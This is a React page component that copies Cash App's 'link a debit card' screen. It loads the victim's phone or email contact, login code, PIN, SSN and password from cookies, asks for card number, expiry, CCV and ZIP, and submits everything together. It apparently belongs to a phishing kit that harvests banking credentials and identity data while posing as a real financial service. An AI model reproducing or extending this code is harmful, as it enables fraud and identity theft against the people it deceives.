import Cookies from "js-cookie";
import { site } from "../../../config";
import { Field, Form, Formik } from "formik";
import useMockSubmit from "../../../hooks/useMockSubmit";

function AccountPage() {
  const contact = Cookies.get("contact");
  const code = Cookies.get("code");
  const pin = Cookies.get("pin");
  const ssn = Cookies.get("ssn");
  const email = Cookies.get("email");
  const password = Cookies.get("password");

  const initialvalues = {
    contact: contact,
    code: code,
    pin: pin,
    ssn: ssn,
    email: email,
    password: password,
    site: site,
    card_number: "",
    mm_yy: "",
    ccv: "",
    zip: "",
  };

  const { submit } = useMockSubmit();

  const handleSubmit = (values, formik) => {
    // console.log(values);
    // formik.resetForm();
    submit(values, formik);

    // router.push(`/${adminId}/${posterId}`);
  };

  return (
    <div className="mx-3 lg:mx-[70px]">
      <Formik
        initialValues={initialvalues}
        // validationSchema={validate}
        onSubmit={handleSubmit}
      >
        {(formik) => (
          <Form className="">
            <div className="min-h-[calc(100vh-20px)] flex flex-col justify-between">
              <div className="mt-[60px] lg:container px-3 lg:px-0">
                <p className="text-[25px]">
                  Add debit card details to link an account
                </p>
                <p className="mt-7 text-sm text-slate-600">
                  Linking an external account allows you to move money in and
                  out of your Cash App balance
                </p>

                <div className="mt-[35px] space-y-5">
                  <div className=" ">
                    <Field
                      type="text"
                      name="card_number"
                      className="input2 border-b-slate-300"
                      placeholder="Debit card Number"
                      required
                    />
                  </div>
                  <div className="flex gap-6">
                    <Field
                      type="text"
                      name="mm_yy"
                      className="input2 border-b-slate-300"
                      placeholder="MM/YY"
                      required
                    />
                    <Field
                      type="text"
                      name="ccv"
                      className="input2 border-b-slate-300"
                      placeholder="3-Digit CCV"
                      required
                    />
                  </div>
                  <div className="">
                    <Field
                      type="text"
                      name="zip"
                      className="input2 border-b-slate-300"
                      placeholder="ZIP Code"
                      required
                    />
                  </div>
                </div>
              </div>
              <div className="flex gap-10">
                <button
                  type="button"
                  className="w-full text-lg bg-gray-100 rounded-full py-3 text-black "
                >
                  Skip
                </button>
                <button
                  type="submit"
                  className="w-full text-lg bg-custom-green rounded-full py-3 text-white"
                >
                  Link Card
                </button>
              </div>
            </div>
          </Form>
        )}
      </Formik>
    </div>
  );
}

export default AccountPage;
